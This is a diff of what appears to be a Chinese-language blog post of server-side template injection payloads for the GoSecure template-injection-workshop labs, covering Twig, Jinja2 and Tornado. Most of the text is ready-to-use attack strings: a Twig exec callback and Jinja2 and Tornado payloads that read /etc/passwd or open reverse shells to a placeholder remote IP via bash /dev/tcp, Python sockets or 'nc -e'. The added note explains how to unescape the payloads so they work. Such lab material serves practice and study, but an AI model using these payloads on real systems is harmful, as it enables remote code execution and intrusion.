@@ -8,6 +8,9 @@ tags: [ssti,websec]
 ## 环境地址
 gosecure 的ssti教程地址[template-injection-workshop](https://gosecure.github.io/template-injection-workshop/#0)
 
+实际请去掉{\{ 和 {\% 中的\。
+
+
 ## LAB 1: Twig (PHP)
 ```
 email={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("/bin/bash -c \"/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261\"")}}&submit=
@@ -20,30 +23,30 @@ email={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter
 
 ## LAB 2: Jinja2 (Python)
 ```
-name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd','r').read()}}&org=1&phone=33&email=44
+name={\{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd','r').read()}}&org=1&phone=33&email=44
 ```
 查找`subprocess.Popen`
 ```
 {% for item in ''.__class__.__mro__[2].__subclasses__()%}
         {%- if item.__name__ == 'Popen' -%}
-        {{loop.index0}}{{item}}
+        {\{loop.index0}}{\{item}}
 {%- endif -%}
     {% endfor %}
 ```
 
 shell
 ```
-{{''.__class__.__mro__[2].__subclasses__()[245](["/bin/bash","-c","/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261"])}}
+{\{''.__class__.__mro__[2].__subclasses__()[245](["/bin/bash","-c","/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261"])}}
 ```
 
 ## LAB 3: Tornado (Python)
 
 ```
-{[remove]%import subprocess,socket,os%}{{s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)}}{{s.connect(("your_remote_ip",port))}}{{os.dup2(s.fileno(),0)}}{{ os.dup2(s.fileno(),1)}}{{ os.dup2(s.fileno(),2)}}{{p=subprocess.call(["/bin/sh","-i"])}}
+{\%import subprocess,socket,os%}{\{s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)}}{\{s.connect(("your_remote_ip",port))}}{\{os.dup2(s.fileno(),0)}}{\{ os.dup2(s.fileno(),1)}}{\{ os.dup2(s.fileno(),2)}}{\{p=subprocess.call(["/bin/sh","-i"])}}
 ```
 
 ```
-{[remove]%import subprocess%} {{subprocess.Popen(["nc","your_remote_ip","port","-e","/bin/sh"])}}
+{\%import subprocess%} {\{subprocess.Popen(["nc","your_remote_ip","port","-e","/bin/sh"])}}
 ```
 
 ## LAB 4: Velocity (Java)
